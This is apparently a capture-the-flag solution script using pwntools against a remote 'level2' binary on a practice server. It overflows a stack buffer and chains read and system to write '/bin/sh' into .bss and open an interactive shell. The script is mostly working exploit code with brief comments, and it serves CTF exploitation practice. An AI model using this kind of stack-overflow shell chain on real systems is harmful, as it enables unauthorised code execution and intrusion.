from pwn import *
context.arch='i386'

# p = process('./level2')
p = remote('node3.buuoj.cn',29470)
elf = ELF('./level2')

payload = 'A'*(0x88+4)
payload += flat([elf.sym['read'], elf.sym['system'], 0, elf.bss(), 8, elf.bss()])
# make stack over flow,
# and call function read to get strings '/bin/sh\x00' for the function system,
# which function read retrun to
p.send(payload)
sleep(0.1)
p.send('/bin/sh\x00')
sleep(1)
p.interactive()
